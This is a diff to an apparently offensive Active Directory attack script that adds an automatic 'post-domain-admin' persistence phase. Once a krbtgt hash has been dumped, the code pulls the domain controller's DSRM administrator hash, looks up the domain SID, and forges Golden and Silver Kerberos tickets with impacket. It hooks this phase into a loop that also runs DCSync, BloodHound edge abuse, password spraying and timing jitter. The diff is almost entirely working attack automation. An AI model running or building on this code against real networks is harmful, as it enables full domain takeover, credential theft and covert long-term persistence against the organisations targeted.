@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.22.0"
+readonly VERSION="1.23.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1644,6 +1644,68 @@ ingest_dcsync_output() {
     fi
     grep -E ':::' "$OUTDIR/secretsdump.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
     return 0
+}
+
+# ===========================================================================
+#  POST-DOMAIN-ADMIN  —  DSRM read + Golden/Silver ticket forging (persistence)
+#  PRECONDITION-GATED: this is only reachable once we ALREADY hold krbtgt (full
+#  DA) — you cannot forge a golden ticket otherwise, so it never "attacks" a
+#  target it hasn't already owned. If there's no krbtgt in the dump, it no-ops.
+#  Fully automatic under --abuse — no prompts.
+# ===========================================================================
+POST_DA_DONE=0
+phase_post_da() {
+    [[ "$POST_DA_DONE" == "1" ]] && return
+    [[ "$IS_DC_ADMIN" != "1" || "$DO_ABUSE" != "1" ]] && return
+    local dump="$OUTDIR/secretsdump.txt"; [[ ! -s "$dump" ]] && return
+    local krbtgt; krbtgt=$(grep -iE '^krbtgt:' "$dump" | head -1 | cut -d: -f4)
+    [[ -z "$krbtgt" ]] && return                 # no krbtgt → forging impossible → not abusable
+    have impacket-ticketer || return
+    POST_DA_DONE=1
+    section "POST-DOMAIN-ADMIN · DSRM + GOLDEN/SILVER TICKETS (persistence)"
+    info "Reachable only because we already hold krbtgt (full DA) — pure persistence material."
+
+    # Admin auth context for the registry/SID reads (reuse whatever DA creds we hold).
+    local -a aenv=() targ=()
+    if [[ -n "$KERB_TICKET" ]]; then aenv=(env "KRB5CCNAME=$KERB_TICKET"); targ=(-k -no-pass "${DC_FQDN:-$DC_IP}")
+    elif [[ -n "$HASH" ]]; then targ=("${DOMAIN}/${USER}@${DC_IP}" -hashes ":$HASH")
+    elif [[ -n "$PASS" ]]; then targ=("${DOMAIN}/${USER}:${PASS}@${DC_IP}")
+    else local ah; ah=$(grep -iE '^administrator:' "$dump" | head -1 | cut -d: -f4)
+         [[ -n "$ah" ]] && targ=("${DOMAIN}/Administrator@${DC_IP}" -hashes ":$ah"); fi
+    [[ ${#targ[@]} -eq 0 ]] && { warn "No DA auth context for DSRM/SID reads — skipping"; return; }
+
+    # --- DSRM: the DC's LOCAL SAM Administrator (Directory Services Restore Mode) ---
+    subsection "DSRM hash (DC local SAM Administrator)"
+    local dsrm="$OUTDIR/dsrm.txt"
+    "${aenv[@]}" impacket-secretsdump "${targ[@]}" -sam 2>&1 | tee -a "$LOGFILE" | tee "$dsrm"
+    local dsrm_h; dsrm_h=$(grep -iE '^Administrator:500:' "$dsrm" | head -1 | cut -d: -f4)
+    [[ -n "$dsrm_h" ]] && loot "DSRM (DC local admin) NT hash: ${C_MAGENTA}$dsrm_h${C_RESET} → dsrm.txt (offline persistence)"
+
+    # --- Domain SID (required to forge tickets) ---
+    local sid
+    sid=$( "${aenv[@]}" impacket-lookupsid "${targ[@]}" 2>/dev/null \
+           | grep -oiP 'Domain SID is:\s*\KS-1-5-21-[0-9-]+' | head -1 )
+    [[ -z "$sid" ]] && { warn "Could not resolve domain SID → skipping ticket forging (DSRM still saved)"; return; }
+
+    # --- GOLDEN ticket: krbtgt hash → Administrator (domain-wide, long-lived) ---
+    subsection "Golden ticket (krbtgt) → Administrator"
+    run "impacket-ticketer -nthash <krbtgt> -domain-sid $sid -domain $DOMAIN Administrator"
+    ( cd "$OUTDIR" && impacket-ticketer -nthash "$krbtgt" -domain-sid "$sid" -domain "$DOMAIN" Administrator >/dev/null 2>&1 \
+        && mv -f Administrator.ccache golden_Administrator.ccache 2>/dev/null )
+    [[ -f "$OUTDIR/golden_Administrator.ccache" ]] \
+        && loot "★ Golden ticket forged → golden_Administrator.ccache  (export KRB5CCNAME=… for DA persistence)"
+
+    # --- SILVER ticket: DC machine hash → CIFS service on the DC (host-scoped) ---
+    local dchash; dchash=$(grep -iE "^${DC_HOST}\\\$:" "$dump" | head -1 | cut -d: -f4)
+    if [[ -n "$dchash" && -n "$DC_FQDN" ]]; then
+        subsection "Silver ticket (DC machine hash) → cifs/${DC_FQDN}"
+        run "impacket-ticketer -nthash <dc\$> -domain-sid $sid -domain $DOMAIN -spn cifs/$DC_FQDN Administrator"
+        ( cd "$OUTDIR" && impacket-ticketer -nthash "$dchash" -domain-sid "$sid" -domain "$DOMAIN" \
+            -spn "cifs/${DC_FQDN}" Administrator >/dev/null 2>&1 \
+            && mv -f Administrator.ccache silver_cifs_Administrator.ccache 2>/dev/null )
+        [[ -f "$OUTDIR/silver_cifs_Administrator.ccache" ]] \
+            && loot "★ Silver ticket forged (cifs/${DC_FQDN}) → silver_cifs_Administrator.ccache"
+    fi
 }
 
 # ===========================================================================
@@ -4955,6 +5017,7 @@ assess_current_credential() {
     if [[ "$BH_DONE" == "0" ]]; then phase_bloodhound; BH_DONE=1; jitter; fi
     phase_bh_abuse;     jitter   # mine THIS identity's BloodHound edges (catches what get-writable misses, e.g. AddSelf)
     phase_dcsync;       jitter
+    phase_post_da;      jitter   # DSRM + Golden/Silver — only fires once krbtgt is in hand (full DA)
     # Spray everything we recovered this round across all users → new pivots
     phase_password_spray
 }
